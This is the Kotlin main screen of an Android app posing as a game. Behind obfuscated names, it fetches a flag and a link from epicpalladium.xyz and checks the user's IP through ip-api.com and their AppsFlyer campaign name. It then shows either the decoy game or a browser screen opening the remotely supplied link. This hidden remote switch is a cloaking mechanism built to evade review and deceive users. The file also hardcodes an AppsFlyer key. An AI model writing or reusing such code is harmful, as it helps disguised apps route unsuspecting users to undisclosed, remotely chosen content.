package com.ngelgames.h

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.ngelgames.h.ImmmortalClass.Companion.C1gtgt
import com.ngelgames.h.ImmmortalClass.Companion.MAIN_IDgtgtt
import com.ngelgames.h.ImmmortalClass.Companion.appsCheckgt
import com.ngelgames.h.ImmmortalClass.Companion.linkkkkk
import com.ngelgames.h.databinding.ActivityMainBinding
import com.ngelgames.h.gogogogo.GoGameActivity


class MainActivity : AppCompatActivity() {
    lateinit var vtgtg: ActivityMainBinding



    private fun getAdId(){
        val fgtgtt = AdvertisingIdClient(applicationContext)
        fgtgtt.start()
        val bhyhy = fgtgtt.info.id
        Hawk.put(MAIN_IDgtgtt, bhyhy)
    }


    private suspend fun getData(): String? {
        val bhnhhh = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInterfacefrfrfrrf::class.java)

        val gtttt = bhnhhh.getData().body()?.jujuj
        return gtttt

    }


    private suspend fun getDataDev(): String? {
        val frgfttgtgtg = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://epicpalladium.xyz/")
            .build()
            .create(ApiInterfacefrfrfrrf::class.java)

        val hyjuujiik = frgfttgtgtg.getDataDev().body()?.jujuu
        val appsChecker = frgfttgtgtg.getDataDev().body()?.juju
        Hawk.put(appsCheckgt, appsChecker)
        Hawk.put(linkkkkk, hyjuujiik)
        val hyhyhyyhyh = frgfttgtgtg.getDataDev().body()?.hyhhy
        return hyhyhyyhyh
    }


    private val gtgtgtgttg: Job = GlobalScope.launch(Dispatchers.IO) {
        val gtgyhyy: String = getData().toString()
        val gthyy = getDataDev().toString()
        val appsChgtgt: String? = Hawk.get(appsCheckgt)
        var naminggtgttg: String? = Hawk.get(C1gtgt)

        getAdId()
        if (appsChgtgt == "1") {
            val gtgtgt = Executors.newSingleThreadScheduledExecutor()
            gtgtgt.scheduleAtFixedRate({
                if (naminggtgttg != null) {
                    if (naminggtgttg!!.contains("tdb2") || gthyy.contains(gtgyhyy)) {
                        gtgtgt.shutdown()
                        startActivity(Intent(this@MainActivity, BrovserActivity::class.java))
                        finish()
                    } else {
                        gtgtgt.shutdown()
                        startActivity(Intent(this@MainActivity, GoGameActivity::class.java))
                        finish()
                    }
                } else {
                    naminggtgttg =  Hawk.get(C1gtgt)
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (gthyy.contains(gtgyhyy)) {
            startActivity(Intent(this@MainActivity, BrovserActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, GoGameActivity::class.java))
            finish()
        }
    }

    private val gttgtgttg = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1gtgt, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        vtgtg = ActivityMainBinding.inflate(layoutInflater)
        setContentView(vtgtg.root)
        GlobalScope.launch(Dispatchers.IO) {
            gtgtgtgttg
        }

        AppsFlyerLib.getInstance()
            .init("tusHEMznATon33B5CJ2Z9H", gttgtgttg, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }
}




